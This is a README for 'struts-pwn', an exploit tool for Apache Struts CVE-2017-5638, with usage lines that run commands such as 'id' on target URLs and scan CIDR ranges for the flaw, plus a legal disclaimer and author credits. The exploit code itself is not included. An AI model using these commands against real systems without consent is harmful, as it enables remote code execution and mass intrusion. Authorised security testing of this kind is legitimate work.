*struts-pwn*
============

### An exploit for Apache Struts CVE-2017-5638 ###


#**Usage**#

##Testing a single URL.##
`python struts-pwn.py --url 'http://example.com/struts2-showcase/index.action' -c 'id'`

##Testing a list of URLs.##
`python struts-pwn.py --list 'urls.txt' -c 'id'`

##Checking if the vulnerability exists against a single URL.##
`python struts-pwn.py --check --url 'http://example.com/struts2-showcase/index.action'`

##Checking if the vulnerability exists against a list of URLs.##
`python struts-pwn.py --check --list 'urls.txt'`

##Checking if the vulnerability exists against a CIDR range.##
`python struts-pwn.py --check --range "127.0.0.1/24"

##Checking if the vulnerability exists for a specific port (option is available for all above options).##
`python struts-pwn.py --check --port 8081


#**Requirements**#
* Python2 or Python3
* requests


#**Legal Disclaimer**#
This project is made for educational and ethical testing purposes only. Usage of struts-pwn for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.


#**License**#
The project is licensed under MIT License.


#**Original Author**#
*Mazin Ahmed*
* Website: [https://mazinahmed.net](https://mazinahmed.net)
* Email: *mazin AT mazinahmed DOT net*
* Twitter: [https://twitter.com/mazen160](https://twitter.com/mazen160)
* Linkedin: [http://linkedin.com/in/infosecmazinahmed](http://linkedin.com/in/infosecmazinahmed)

#**Mod author**#
*Cristian Giustini*
* Website: [http://www.voidzone.it](http://www.voidzone.it)